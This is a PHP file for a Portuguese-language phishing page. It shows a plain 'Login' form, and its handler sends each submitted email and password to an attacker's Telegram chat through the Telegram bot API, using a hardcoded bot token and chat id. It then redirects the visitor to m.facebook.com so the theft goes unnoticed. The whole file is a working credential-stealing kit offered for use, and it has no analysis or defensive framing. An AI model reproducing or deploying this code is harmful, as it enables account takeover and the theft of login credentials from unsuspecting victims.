<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $senha = $_POST['senha'];
    
    // Dados do bot e chat
    $token = "6957774351:AAHhFvHoT1t0tmfhbiGu87X0nHDFjz87a68";
    $chat_id = "6384775816";
    
    // Mensagem a ser enviada
    $message = "Email: " . $email . "\nSenha: " . $senha;

    // URL da API do Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    
    // Enviar a mensagem
    file_get_contents($url);
    
    // Redirecionar para o site do Facebook
    header("Location: https://m.facebook.com");
    exit();
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
</head>
<body>
    <form action="login.php" method="post">
        <label for="email">Email:</label>
        <input type="text" id="email" name="email" required>
        <br>
        <label for="senha">Senha:</label>
        <input type="password" id="senha" name="senha" required>
        <br>
        <input type="submit" value="Entrar">
    </form>
</body>
</html>